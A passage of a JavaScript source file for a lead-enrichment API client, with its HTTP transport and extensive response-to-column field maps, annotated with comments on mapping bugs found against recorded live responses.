/** `richapi_COMPACT_RESPONSES=0|false|no|off` turns the discount off. Default: on. */
export function compactEnabled (env = process.env) {
  const raw = String(env?.[COMPACT_ENV] ?? '').trim().toLowerCase();
  if (raw === '') return true;
  return !(raw === '0' || raw === 'false' || raw === 'no' || raw === 'off');
}

/** Does `endpoint` reach the waterfall handler, i.e. will the header do anything? */
export function honoursCompact (endpoint) {
  return typeof endpoint === 'string' && COMPACT_ENDPOINT_SET.has(endpoint);
}

/**
 * The transport. `fetchImpl` is injectable so tests can prove the zero-call claim
 * with a client that throws on any call rather than a counter that reports zero.
 */
export class RichApiClient {
  constructor ({
    apiKey,
    baseUrl,
    fetchImpl = globalThis.fetch,
    timeoutMs = 60_000,
    env = process.env,
    compact = undefined,
  } = {}) {
    this.apiKey = apiKey !== undefined ? apiKey : (env?.richapi_API_KEY ?? null);
    // Compact mode: explicit option wins; otherwise the env switch; otherwise on.
    this.compact = compact === undefined ? compactEnabled(env) : Boolean(compact);
    // THROWS UnsafeOrigin on a refused override. Deliberately not caught here: a
    // client that quietly fell back to the default would send the key to
    // api.richapi.ai while the user believed their override was in force.
    const resolved = resolveBaseUrl({ baseUrl, env });
    this.baseUrl = resolved.baseUrl;
    this.baseUrlSource = resolved.source;
    this.fetchImpl = fetchImpl;
    this.timeoutMs = timeoutMs;
    this.callCount = 0;
  }

  requireKey () {
    if (!present(this.apiKey)) {
      throw new MissingApiKey('richapi_API_KEY is not set. Export it, or use --dry-run (which spends nothing).');
    }
  }

  /**
   * One POST. Resolves { status, body, headers } on 2xx; throws HttpError otherwise.
   * 429 carries retryAfter; 402 carries the body, whose `reserved` + `balance`
   * refresh the cached balance for free.
   */
  async post (endpoint, payload) {
    this.requireKey();
    this.callCount += 1;
    const url = `${this.baseUrl}/${endpoint}`;
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), this.timeoutMs);
    const headers = { 'content-type': 'application/json', 'x-api-key': this.apiKey };
    // Compact header only on the endpoints the waterfall handler serves — everywhere else the
    // header is inert, and sending it would imply a server behaviour that is not there.
    if (this.compact && honoursCompact(endpoint)) headers[COMPACT_HEADER] = COMPACT_HEADER_VALUE;
    let res;
    try {
      res = await this.fetchImpl(url, {
        method: 'POST',
        headers,
        body: JSON.stringify(payload ?? {}),
        signal: controller.signal,
      });
    } catch (err) {
      clearTimeout(timer);
      throw new HttpError(0, { body: { message: String(err?.message ?? err) }, code: 'network_error' });
    }

    // The timer is cleared AFTER the body is read, not in a `finally` around the
    // fetch. `fetch` resolves on HEADERS; the body streams afterwards. Clearing the
    // abort timer at the old point left `await res.json()` with no deadline at all,
    // so a server that sent headers and then trickled bytes hung the CLI forever
    // while the 60s ceiling sat there looking like it applied.
    let body = null;
    let bodyErr = null;
    try {
      body = await res.json();
    } catch (err) {
      bodyErr = err;
      body = null;
    } finally {
      clearTimeout(timer);
    }
    // A body that timed out is NOT an empty body. Only the abort path throws; an
    // unparseable-but-complete body still degrades to null exactly as before.
    if (bodyErr && controller.signal.aborted) {
      throw new HttpError(0, {
        body: { message: `response body not received within ${this.timeoutMs}ms` },
        code: 'network_error',
      });
    }

    if (res.ok) {
      this.lastStatus = res.status;
      return { status: res.status, body, headers: res.headers };
    }

    const retryAfter = res.headers?.get?.('retry-after') ?? null;
    // Same type, same fields, plus the server's own remediation on `hint` —
    // echo-scrubbed against the payload we just sent.
    throw httpErrorFor(res.status, {
      body,
      retryAfter: retryAfter === null ? null : Number(retryAfter),
      endpoint,
      payload,
    });
  }
}

/**
 * Response field maps: API key -> output column.
 *
 * WHY THIS IS NOT AN ALLOWLIST. The previous version filtered responses through a
 * hand-written 10-key snake_case list. The API answers in camelCase, so
 * `enrich_profile` and `enrich_company` contributed ZERO columns while the user paid
 * for them, and a downstream "is this row already enriched?" check keyed on `title`
 * and `company_name` could never become true — so every row was re-enriched forever.
 *
 * PROVENANCE. Until 2026-09-02 these names came from the spec's documented 200 example
 * KEYS, and this constant read `spec_documented_keys_not_live_verified` to say so. The
 * caveat turned out to be the whole story: the spec's key names were wrong about where
 * the payload lives, and the pack dropped the email, the phone and the verification
 * verdict on every paid call for it.
 *
 * Every path in RESPONSE_MAPS is now a path a recorded 200 response actually contained.
 * tests/response-maps replays each endpoint's recording through mapResponse and fails the
 * build if one stops resolving, so this marker is checkable rather than aspirational.
 *
 * It is still not a promise about EVERY response: a capture is one sample, and a shape
 * that varies by input or by provider can differ from the one recorded. That is what
 * MAP_PARTIAL and the weekly canary are for.
 */
export const RESPONSE_MAP_STATUS = 'live_captured_2026_08_31_single_sample';

// ---------------------------------------------------------------------------
// RESPONSE_MAPS — rewritten 2026-09-02 from RECORDED LIVE RESPONSES, not the spec.
// ---------------------------------------------------------------------------
//
// THIS TABLE WAS WRONG, AND IT WAS WRONG WHERE IT COST THE MOST.
//
// Every key below used to be lifted from the spec's 200 examples. On 2026-08-31 the
// capture harness recorded 55 real responses, and the diff against this table was:
//
//   endpoint             price   columns delivered   what was lost
//   email_finder          5cr    1 of 3              THE EMAIL
//   email_verifier        2cr    0 of 5              everything
//   phone_finder         25cr    0 of 2              THE PHONE NUMBER
//   enrich_profile        1cr    4 of 11             title, company, url, location
//   enrich_company         —     4 of 10             industry, size, HQ, founded
//   identify_email_type    —     1 of 2              the classification
//
// The default waterfall — profile -> email -> verify, ~8 credits a contact — returned
// the email in ZERO cases. Three separate causes, all visible in the captures:
//
//   1. ENVELOPE. email_finder, email_verifier and phone_finder wrap their payload in
//      `result`. mapResponse unwrapped only `data`. `body.email` was undefined; the
//      address was at `body.result.email` the whole time.
//   2. KEY NAMES. enrich_profile answers `picture`/`url`/`positionGroups`, not
//      `profilePicture`/`linkedinUrl`/`currentTitle`. enrich_company answers
//      `followers`/`staff`/`foundedYear`/`industries`, not
//      `followerCount`/`companySize`/`founded`/`industry`.
//   3. THE DETECTOR MISSED IT. inspectResponse flagged a mapping failure on ZERO
//      columns. email_finder produced one — `provider` happened to match — so it
//      reported `mapped` and said nothing while the email was dropped. That hole is
//      closed by RESPONSE_HEADLINE_COLUMNS below.
//
// This is the empty-column failure the comments in this file already say "shipped once
// already". It shipped twice. The difference now is that the evidence is recorded:
// every path below appears verbatim in `_lib/api-catalog.json`'s `field_map_keys` for
// its endpoint, which `richapi catalog gen --absorb-live` derives from the captures,
// and tests/response-maps fails the build if a path here is not one the server answered with.
//
// PATHS, NOT KEYS. A key may now be a dotted path from the BODY ROOT
// (`result.email`, `positionGroups.0.profilePositions.0.title`). There is no implicit
// envelope unwrapping any more: the path says exactly where the value came from, which
// is the only form that cannot silently read the wrong object. `.0` is an array index
// and is honest about being positional.
//
// connectionCount / followerCount are GONE from enrich_profile. They are not in the
// recorded response at all; the spec documented them and the server does not answer
// with them. /evidence-score must not reach for a column no paid call can produce.
export const RESPONSE_MAPS = Object.freeze({
  enrich_profile: {
    firstname: 'first_name',
    lastname: 'last_name',
    headline: 'headline',
    summary: 'summary',
    url: 'linkedin_url',
    picture: 'profile_picture',
    industry: 'industry',
    // `entityUrn` is the LinkedIn URN. LIMITATIONS.md §3 records that the bulk
    // endpoints take URNs where the single forms take URLs and that "nothing in the
    // API converts one to the other". The profile hop returns one. That does not make
    // batching safe on its own — attribution is still positional — but it does mean
    // the URN is obtainable, so the note stays accurate only if this column exists.
    entityUrn: 'linkedin_urn',
    'location.defaultValue': 'location',
    'location.city': 'location_city',
    'location.state': 'location_state',
    'location.country': 'location_country',
    // Current role, read off the first position group's first position. Positional,
    // and named as such: LinkedIn orders these most-recent-first in every capture,
    // but one capture is one sample and the index says so.
    'positionGroups.0.profilePositions.0.title': 'title',
    'positionGroups.0.company.name': 'company_name',
    // The employer's registered domain, straight off the profile hop. This is the
    // input `email_finder` needs, so a row that arrives with only a LinkedIn URL can
    // reach the email hop without a separate company lookup.
    'positionGroups.0.company.domain': 'company_domain',
    'positionGroups.0.company.url': 'company_linkedin_url',
    'positionGroups.0.profilePositions.0.date.start': 'current_role_started',
    // Buying signals a rep acts on, all scalars the paid call already returned.
    openToWork: 'open_to_work',
    hiring: 'hiring',
    premium: 'linkedin_premium',
    influencer: 'linkedin_influencer',
    creator: 'linkedin_creator',
    'educations.0.school.name': 'education_school',
  },
  enrich_company: {
    name: 'company_name',
    website: 'company_website',
    description: 'company_description',
    logo: 'company_logo',
    url: 'company_linkedin_url',
    followers: 'company_follower_count',
    // `industry` (person) and `company_industry` (employer) are DIFFERENT concepts and
    // a row is enriched by both hops into one record (`{...prior, ...mapped}`), so an
    // unprefixed name here would overwrite the person's industry with the employer's.
    'industries.0': 'company_industry',
    'specialities.0': 'company_speciality',
    'staff.total': 'company_size',
    'staff.range.start': 'company_size_range_min',
    'locations.headquarter.city': 'hq_city',
    'locations.headquarter.geographicArea': 'hq_region',
    'locations.headquarter.country': 'hq_country',
    'locations.headquarter.postalCode': 'hq_postal_code',
    'locations.headquarter.line1': 'hq_street',
    universalName: 'company_universal_name',
    objectUrn: 'company_urn',
  },
  email_finder: {
    'result.email': 'email',
    'result.email_status': 'email_status',
    'result.esp': 'email_esp',
    provider: 'email_provider',
  },
  email_verifier: {
    // The verifier's verdict is NOT the finder's `email_status` (which is the ESP's
    // view of the address). Two hops, two columns, or the later one silently
    // overwrites the earlier with a different meaning.
    'result.status': 'email_verification_status',
    provider: 'email_verify_provider',
  },
  phone_finder: {
    'result.phone': 'phone',
    'result.phone_status': 'phone_status',
    provider: 'phone_provider',
  },
  identify_email_type: {
    // `address` echoes the address that was analysed. It is deliberately NOT `email`:
    // overwriting a found address with the one we asked about would turn a miss into a
    // fake hit on the merged record.
    address: 'email_analyzed',
    domain: 'email_domain',
    username: 'email_username',
    guessed_name: 'email_guessed_name',
    email_provider: 'email_provider_name',
    is_likely_company_email: 'email_is_company',
    is_likely_personal_email: 'email_is_personal',
    is_likely_education_email: 'email_is_education',
    is_gmail: 'email_is_gmail',
    is_hotmail: 'email_is_hotmail',
    is_yahoo: 'email_is_yahoo',
    is_icloud: 'email_is_icloud',
    is_proton: 'email_is_proton',
    is_yandex: 'email_is_yandex',
  },
  // Mapped for the first time. The comment below this table used to say the spec and
  // the backend manifest disagreed about this endpoint's shape, so mapping either would
  // be wrong against the other, and it stayed unmapped and loud. The 2026-08-31 capture
  // settles it: the server answers the resolved async envelope
  // `{id, data:{email,status,verifier}, status}`. A recorded response outranks both
  // documents (law 6), so it is mapped now — and it is a PAID endpoint that until today
  // delivered no columns at all.
  find_personal_email: {
    'data.email': 'personal_email',
    'data.status': 'personal_email_status',
    'data.verifier': 'personal_email_verifier',
  },
  // Mapped 2026-09-17 off tests/fixtures/live/post_details.json. The live post-engagers
  // run paid for this call and handed the user `{}`: there was no map at all. Every
  // column is `post_`-prefixed because a row merges hops into one record, and an
  // unprefixed `first_name` here would overwrite the person the row is about with the
  // post's author.
  post_details: {
    urn: 'post_urn',
    threadUrn: 'post_thread_urn',
    shareUrn: 'post_share_urn',
    shareUrl: 'post_url',
    commentary: 'post_text',
    numComments: 'post_comment_count',
    numReactions: 'post_reaction_count',
    'reactionType.like': 'post_reactions_like',
    'reactionType.praise': 'post_reactions_praise',
    'reactionType.empathy': 'post_reactions_empathy',
    'reactionType.interest': 'post_reactions_interest',
    sponsored: 'post_sponsored',
    'actor.firstName': 'post_author_first_name',
    'actor.lastName': 'post_author_last_name',
    'actor.headline': 'post_author_headline',
    'actor.profileId': 'post_author_profile_id',
    'actor.entityUrn': 'post_author_urn',
    'actor.profileType': 'post_author_type',
    'content.document.title': 'post_document_title',
    'content.document.totalPages': 'post_document_pages',
  },

  // -------------------------------------------------------------------------
  // ADDED 2026-09-17, off the recordings in tests/fixtures/live/.
  // -------------------------------------------------------------------------
  //
  // Eleven live recipe runs found these endpoints answering 2xx with real data and
  // arriving at the user as a raw body, because there was no map at all. Every path
  // below appears verbatim in that endpoint's recorded response (law 2 — a key that is
  // not in a recording is not written here), and tests/response-maps replays the
  // recording through mapResponse on every build.
  //
  // WHAT IS DELIBERATELY *NOT* HERE, and why, so the gap is a decision and not a hole:
  //
  //   enrich_profiles_bulk, enrich_companies_bulk, similarweb_scraper_sync,
  //   google_maps_places_scraper_keyword, google_maps_places_scraper_sync_using_url,
  //   google_search_scraper_sync, crunchbase_company_scraper_sync,
  //   meta_ads_library_scraper_sync
  //     A TOP-LEVEL ARRAY. `mapResponse` maps one object to one row; these answer N
  //     rows, which is `_lib/batch.mjs`'s job, not a field map's. The catalog publishes
  //     their keys at ELEMENT level (`name`, not `0.name`), so no single-row map could
  //     even address them. They stay raw until the runtime grows a row-per-element
  //     path.
  //
  //   find_website_by_company_name, find_linkedin_url_by_email, web_social_links,
  //   web_emails
  //     The recording is a MISS: `{"data":{"Website":null},"message":"not found"}`,
  //     `{"data":{"error":{"status":404}}}`, `{"data":{"links":{}}}`,
  //     `{"data":{"emails":[]}}`. The only keys recorded are the not-found envelope,
  //     so any map written from them would be inventing the hit shape — the exact
  //     failure of 2026-09-02, one level up.
  //
  //   search_reference_data
  //     A reference taxonomy (the industry / seniority / language facet lists), not a
  //     fact about a row. "The first industry in LinkedIn's list" is not a column on a
  //     contact.
  //
  //   geo_id_search, linkedin_ad_search, google_ad_transparency_scraper_sync,
  //   google_maps_reviews_scraper_sync, slack_channel_members
  //     No recorded 2xx at all. Nothing to write a map from.
  clean_domain: {
    clean_domain: 'cleaned_domain',
    clean_url: 'cleaned_url',
    validated_domain: 'domain_is_valid',
  },
  directory_yellowpages: {
    'data.businesses.0.name': 'business_name',
    'data.businesses.0.address': 'business_address',
    'data.businesses.0.phone': 'business_phone',
  },
  distribute_leads: {
    assigned_label: 'assigned_to',
    assigned_value: 'assigned_to_value',
    assignment_index: 'assignment_index',
  },
  find_sitemap_urls: {
    total_urls: 'sitemap_url_count',
    filtered_urls: 'sitemap_filtered_url_count',
    'sitemap_urls.0': 'sitemap_index_url',
    'urls.0': 'sitemap_first_url',
  },
  linkedin_ad_details: {
    'element.id': 'ad_id',
  },
  normalize_company: {
    normalized_name: 'normalized_company_name',
    changes_applied: 'company_name_changed',
    case_normalized: 'company_name_case_normalized',
  },
  normalize_phone: {
    e164_format: 'phone_e164',
    international_format: 'phone_international',
    national_format: 'phone_national',
    country_code: 'phone_country_code',
    region_code: 'phone_region',
    number_type: 'phone_number_type',
    is_valid: 'phone_is_valid',
    is_possible: 'phone_is_possible',
    can_be_internationally_dialed: 'phone_can_dial_internationally',
    successfully_parsed: 'phone_parsed',
  },
  profile_social_metrics: {
    connectionsCount: 'connection_count',
    followersCount: 'follower_count',
    verified: 'linkedin_verified',
  },
  search_bing: {
    'data.total_results': 'search_result_count',
    'data.results.0.title': 'search_top_title',
    'data.results.0.url': 'search_top_url',
    'data.results.0.description': 'search_top_description',
  },
  search_google_trends: {
    'data.geo': 'trend_geo',
    'data.timeframe': 'trend_timeframe',
    'data.timeline.0.date': 'trend_first_point_date',
    'data.timeline.0.value': 'trend_first_point_value',
    'data.related.0.query': 'trend_top_related_query',
    'data.related.0.value': 'trend_top_related_value',
    'data.rising.0.query': 'trend_top_rising_query',
    'data.rising.0.value': 'trend_top_rising_value',
    'data.interest_by_region.0.region': 'trend_top_region',
    'data.interest_by_region.0.value': 'trend_top_region_value',
  },
  web_json_ld: {
    'data.count': 'json_ld_block_count',
    'data.items.0.@graph.0.@type': 'json_ld_type',
    'data.items.0.@graph.0.name': 'json_ld_name',
    'data.items.0.@graph.0.url': 'json_ld_url',
    'data.items.0.@graph.0.logo': 'json_ld_logo',
  },
  web_meta_tags: {
    'data.seo.title': 'page_title',
    'data.seo.description': 'page_description',
    'data.seo.canonical': 'canonical_url',
    'data.seo.language': 'page_language',
    'data.seo.robots': 'page_robots',
    'data.og.site_name': 'og_site_name',
    'data.og.image': 'og_image',
    'data.og.type': 'og_type',
    'data.twitter.card': 'twitter_card',
    'data.favicon': 'favicon_url',
  },
  web_pixels: {
    'data.total_pixels_found': 'pixels_found_count',
  },
  web_scrape: {
    'data.title': 'page_title',
  },
  web_sitemap: {
    'data.source': 'sitemap_source',
    'data.total_count': 'sitemap_url_count',
    'data.urls.0': 'sitemap_first_url',
  },
  web_tech_stack: {
    'data.summary': 'tech_stack_summary',
    'data.gtm_signals.company_stage': 'tech_company_stage',
    'data.gtm_signals.estimated_monthly_tech_spend': 'tech_monthly_spend_estimate',
    'data.technologies.0.name': 'top_technology',
    'data.technologies.0.category': 'top_technology_category',
    'data.technologies.0.confidence': 'top_technology_confidence',
  },
  website_intelligence: {
    'data.final_url': 'final_url',
    'data.http_status': 'http_status',
    'data.page_load_time_ms': 'page_load_ms',
    'data.seo_score': 'seo_score',
    'data.seo_issues.0': 'seo_top_issue',
    'data.ssl.grade': 'ssl_grade',
    'data.ssl.issuer': 'ssl_issuer',
    'data.ssl.expires': 'ssl_expires',
    'data.ssl.days_until_expiry': 'ssl_days_until_expiry',
    'data.headers.security_score': 'security_header_score',
    'data.headers.csp': 'has_csp',
    'data.headers.hsts': 'has_hsts',
    'data.headers.permissions_policy': 'has_permissions_policy',
    'data.dns.a_records.0': 'dns_a_record',
    'data.emails.emails.0': 'site_first_email',
    'data.json_ld.count': 'json_ld_block_count',
    'data.pixels.total_pixels_found': 'pixels_found_count',
    'data.social_links.total_links_found': 'social_links_found_count',
    'data.meta_tags.seo.title': 'page_title',
    'data.meta_tags.seo.description': 'page_description',
    'data.meta_tags.seo.canonical': 'canonical_url',
    'data.meta_tags.favicon': 'favicon_url',
    'data.meta_tags.og.site_name': 'og_site_name',
    'data.meta_tags.og.image': 'og_image',
    'data.tech_stack.gtm_signals.company_stage': 'tech_company_stage',
    'data.tech_stack.gtm_signals.estimated_monthly_tech_spend': 'tech_monthly_spend_estimate',
    'data.tech_stack.technologies.0.name': 'top_technology',
    'data.tech_stack.technologies.0.category': 'top_technology_category',
    'data.tech_stack.technologies.0.confidence': 'top_technology_confidence',
  },
  youtube_channel: {
    'data.channel_id': 'youtube_channel_id',
    'data.name': 'youtube_channel_name',
    'data.description': 'youtube_channel_description',
    'data.subscriber_count': 'youtube_subscriber_count',
    'data.video_count': 'youtube_channel_video_count',
    'data.view_count': 'youtube_channel_view_count',
  },
  youtube_channel_videos: {
    'data.channel': 'youtube_channel_name',
    'data.total_count': 'youtube_videos_returned',
    'data.videos.0.video_id': 'youtube_latest_video_id',
    'data.videos.0.title': 'youtube_latest_video_title',
    'data.videos.0.duration': 'youtube_latest_video_duration',
  },
  youtube_search: {
    'data.results.0.video_id': 'youtube_top_video_id',
    'data.results.0.title': 'youtube_top_video_title',
    'data.results.0.channel': 'youtube_top_video_channel',
    'data.results.0.channel_id': 'youtube_top_video_channel_id',
    'data.results.0.duration': 'youtube_top_video_duration',
    'data.results.0.view_count': 'youtube_top_video_views',
  },
  youtube_video: {
    'data.video_id': 'youtube_video_id',
    'data.title': 'youtube_video_title',
    'data.channel': 'youtube_video_channel',
    'data.channel_id': 'youtube_video_channel_id',
    'data.description': 'youtube_video_description',
    'data.duration': 'youtube_video_duration',
    'data.view_count': 'youtube_video_views',
    'data.like_count': 'youtube_video_likes',
    'data.upload_date': 'youtube_video_uploaded',
    'data.categories.0': 'youtube_video_category',
    'data.tags.0': 'youtube_video_first_tag',
  },
});

/**
 * The column each paid call is BOUGHT for.
 *
 * The zero-column tripwire could not see the email_finder failure: one incidental key
 * (`provider`) matched, the count was non-zero, and `mapped` was reported while the
 * address was thrown away. A partial read of a paid response is not a success, and the
 * only way to say so is to name which column is the point of the call.
 *
 * The rule this enables (see inspectResponse): a response that carries data but not
 * the headline column is MAP_PARTIAL — loud — while a response that carries nothing at
 * all stays MAP_EMPTY, which is a genuine not-found and correct.
 */
export const RESPONSE_HEADLINE_COLUMNS = Object.freeze({
  enrich_profile: 'first_name',
  enrich_company: 'company_name',
  email_finder: 'email',
  email_verifier: 'email_verification_status',
  phone_finder: 'phone',
  post_details: 'post_urn',
  identify_email_type: 'email_is_company',
  find_personal_email: 'personal_email',

  // Added 2026-09-17 alongside the maps above.
  clean_domain: 'cleaned_domain',
  directory_yellowpages: 'business_name',
  distribute_leads: 'assigned_to',
  find_sitemap_urls: 'sitemap_url_count',
  linkedin_ad_details: 'ad_id',
  normalize_company: 'normalized_company_name',
  normalize_phone: 'phone_e164',
  profile_social_metrics: 'follower_count',
  search_bing: 'search_top_url',
  search_google_trends: 'trend_geo',
  web_json_ld: 'json_ld_block_count',
  web_meta_tags: 'page_title',
  web_pixels: 'pixels_found_count',
  web_scrape: 'page_title',
  web_sitemap: 'sitemap_url_count',
  web_tech_stack: 'tech_stack_summary',
  website_intelligence: 'final_url',
  youtube_channel: 'youtube_channel_id',
  youtube_channel_videos: 'youtube_latest_video_id',
  youtube_search: 'youtube_top_video_id',
  youtube_video: 'youtube_video_id',
});

/**
 * Keys the API is DOCUMENTED TO RETURN that this pack deliberately does NOT map.
 *
 * Every one of these is an array whose recorded value is `[]` — in the spec's 200
 * example and in the backend's generated `richapi-endpoints.manifest.json` alike. An
 * empty array names a field and records NOTHING about its elements, so there is no
 * evidence, anywhere in this repo or in the server's own catalog, for what one
 * element of `experience` or `specialties` looks like. Mapping them would mean
 * inventing that shape — law 2 (the spec is a cost-and-route source, NOT a schema
 * source) and law 4 (never fabricate an actual) both forbid it — and `mapResponse`
 * skips arrays and objects by design, because they are not spreadsheet columns.
 *
 * So the honest state is "unread, on purpose, for a stated reason", declared here
 * instead of left as a hole in the table above: an UNRECORDED gap is exactly how a
 * paid field goes unread for a quarter. The invariant tests/response-maps enforces is that
 * for every mapped endpoint, `RESPONSE_MAPS` keys + this list == the catalog's
 * published key set, exactly. Nothing the API returns can be missing from both, and
 * shrinking this list without adding the mapping fails the build.
 *
 * TO CLOSE ONE: capture a live fixture (`bin/richapi-capture-fixtures.mjs --run`)
 * that shows the array NON-empty, read the element shape off the recording, and only
 * then move the key into `RESPONSE_MAPS` with a flattening that recorded shape
 * actually supports.
 */
export const RESPONSE_KEYS_DELIBERATELY_UNMAPPED = Object.freeze({
  enrich_profile: Object.freeze([
    // Internal LinkedIn identifiers. `linkedin_urn` (entityUrn) and `linkedin_url`
    // already carry identity; these two are the same fact in two more encodings.
    'identifier', 'objectUrn',
    // A banner image, not a GTM field.
    'background',
    // Lower-fidelity duplicate of `location` (location.defaultValue).
    'location.shortValue',
    // Group-level start date. `current_role_started` reads the POSITION's start, which
    // is the one that means "how long in this job"; the group's start means "how long
    // at this company", and mapping both under one name would silently pick one.
    'positionGroups.0.date.start',
    // Duplicate of positionGroups.0.company.name at lower fidelity (a display string
    // rather than the resolved company record).
    'positionGroups.0.profilePositions.0.company',
    // Company-record internals behind the current role: an id, an image and an enum.
    'positionGroups.0.company.id',
    'positionGroups.0.company.logo',
    'positionGroups.0.company.profileType',
    // First education entry beyond the school NAME. Positional detail off a
    // single-sample array; the school name is the part a rep uses.
    'educations.0.date.start', 'educations.0.date.end',
    'educations.0.school.id', 'educations.0.school.logo',
    'educations.0.school.profileType', 'educations.0.school.url',
  ]),
  enrich_company: Object.freeze([
    // A banner image and an entity-type enum.
    'cover', 'type',
    // Marketing hashtags off the company page — not a field anything routes on.
    'hashtags.0',
    // A SECOND office, positionally. The headquarter block is mapped in full; which
    // office lands at index 0 of `other` is not a fact this pack can rely on.
    'locations.other.0.city', 'locations.other.0.country',
    'locations.other.0.geographicArea', 'locations.other.0.line1',
    'locations.other.0.postalCode',
  ]),
  // `success` is the envelope flag, already read as meta by inspectResponse. The
  // execution log is the per-provider attempt trace — genuinely useful when debugging
  // a miss, and genuinely not a spreadsheet column, so it is named here rather than
  // left in neither list.
  // `providers_tried` is a TRANSPORT DIAGNOSTIC, not a field anyone asked for, and
  // mapping it was actively harmful: a genuine miss still reports how many providers
  // were tried, so it produced a column, and a response with a column but no headline
  // is a PARTIAL read. That turned every honest not-found into a false alarm. It is
  // still worth having in a debug view; it is not a spreadsheet column.
  email_finder: Object.freeze([
    'success', 'providers_tried',
    'execution_log.0.provider', 'execution_log.0.status', 'execution_log.0.latency_ms',
  ]),
  email_verifier: Object.freeze([
    'success', 'providers_tried',
    'execution_log.0.provider', 'execution_log.0.status', 'execution_log.0.latency_ms',
  ]),
  phone_finder: Object.freeze([
    'success', 'providers_tried',
    'execution_log.0.provider', 'execution_log.0.status', 'execution_log.0.latency_ms',
  ]),
  find_personal_email: Object.freeze([
    // The async job id and the job's own status envelope. `data.status` is the
    // address's status and IS mapped; this outer one is the job's.
    'id', 'status',
  ]),
  post_details: Object.freeze([
    // Images and an internal numeric id for the author; identity is post_author_urn.
    'actor.objectUrn', 'actor.profileBackground', 'actor.profilePicture',
    // ONE positional sample of the comment and reaction lists. A row cannot hold a
    // list, and the first commenter is not "the" commenter: the engagers come from
    // `richapi search post_activities`, which pages the full list.
    'comments.0.comment', 'comments.0.commenter.entityUrn', 'comments.0.commenter.firstName',
    'comments.0.commenter.headline', 'comments.0.commenter.lastName',
    'comments.0.commenter.objectUrn', 'comments.0.commenter.profileBackground',
    'comments.0.commenter.profileId', 'comments.0.commenter.profilePicture',
    'comments.0.commenter.profileType', 'comments.0.id', 'comments.0.totalComments',
    'comments.0.totalReactions', 'comments.0.url',
    'reactions.0.reaction', 'reactions.0.reactor.entityUrn', 'reactions.0.reactor.firstName',
    'reactions.0.reactor.headline', 'reactions.0.reactor.lastName',
    'reactions.0.reactor.objectUrn', 'reactions.0.reactor.profileId',
    'reactions.0.reactor.profileType',
    // A signed, expiring media link and its expiry: stale within hours, not a column.
    'content.document.documentUrl', 'content.document.expiry',
  ]),

  // Added 2026-09-17. Computed as published-minus-mapped, so the coverage invariant
  // in tests/response-maps cannot be broken by a typo here.
  directory_yellowpages: Object.freeze([
    // RECORDED EMPTY on every business in the capture (`""`). An empty string records
    // that the key exists and nothing at all about the value, so there is no evidence
    // for what a real one looks like — and `mapResponse` drops an empty scalar anyway,
    // so mapping them would declare two columns that can never populate.
    'data.businesses.0.website',
    'data.businesses.0.rating',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  distribute_leads: Object.freeze([
    // the round-robin cursor: a fact about the distribution run, not about this row.
    'next_index',
    // the size of the distribution list, not a fact about this row.
    'total_assignments',
  ]),
  find_sitemap_urls: Object.freeze([
    // echoes the domain that was asked.
    'domain',
  ]),
  normalize_company: Object.freeze([
    // echoes the name that was asked — mapping it would overwrite the row input.
    'original_name',
  ]),
  normalize_phone: Object.freeze([
    // a tel: URI form of the number already mapped as phone_e164.
    'rfc3966_format',
  ]),
  search_bing: Object.freeze([
    // echoes the query that was asked — mapping it would overwrite the row input.
    'data.query',
    // the display form of the url already mapped.
    'data.results.0.displayed_url',
    // always 1 for the first result — a constant, not a fact.
    'data.results.0.position',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  search_google_trends: Object.freeze([
    // echoes the keyword that was asked.
    'data.keyword',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  web_json_ld: Object.freeze([
    // always schema.org — a constant, not a fact.
    'data.items.0.@context',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  web_meta_tags: Object.freeze([
    // og fields that duplicate the seo title/description/url already mapped.
    'data.og.description',
    'data.og.locale',
    'data.og.title',
    'data.og.url',
    // og image dimensions and alt text.
    'data.og.extra.image:alt',
    'data.og.extra.image:height',
    'data.og.extra.image:type',
    'data.og.extra.image:width',
    // crawler directives and an app name, not a GTM field.
    'data.other.application-name',
    'data.other.googlebot',
    // page-rendering detail (charset, viewport, keywords).
    'data.seo.charset',
    'data.seo.keywords',
    'data.seo.viewport',
    // the Twitter card duplicates the seo title and description.
    'data.twitter.description',
    'data.twitter.image',
    'data.twitter.title',
    // Twitter card image dimensions and alt text.
    'data.twitter.extra.image:alt',
    'data.twitter.extra.image:height',
    'data.twitter.extra.image:type',
    'data.twitter.extra.image:width',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  web_pixels: Object.freeze([
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  web_scrape: Object.freeze([
    // the whole page source; a document is not a spreadsheet cell.
    'data.html',
    // the whole page as markdown; a document is not a spreadsheet cell.
    'data.markdown',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  web_sitemap: Object.freeze([
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  web_tech_stack: Object.freeze([
    // a per-category histogram whose KEYS vary by site; a column that exists only when the site runs a CMS is not a column.
    'data.categories_count.Backend Framework',
    'data.categories_count.Build Tool',
    'data.categories_count.CMS',
    'data.categories_count.Framework',
    'data.categories_count.Hosting',
    'data.categories_count.Library',
    'data.categories_count.SEO',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  website_intelligence: Object.freeze([
    // page weight, not a GTM field.
    'data.content_length_bytes',
    // the JSON-LD block itself; web_json_ld() reads it properly.
    'data.json_ld.items.0.@context',
    // og fields that duplicate the seo title/description/canonical already mapped.
    'data.meta_tags.og.description',
    'data.meta_tags.og.locale',
    'data.meta_tags.og.title',
    'data.meta_tags.og.type',
    'data.meta_tags.og.url',
    // og image dimensions and alt text — rendering detail.
    'data.meta_tags.og.extra.image:alt',
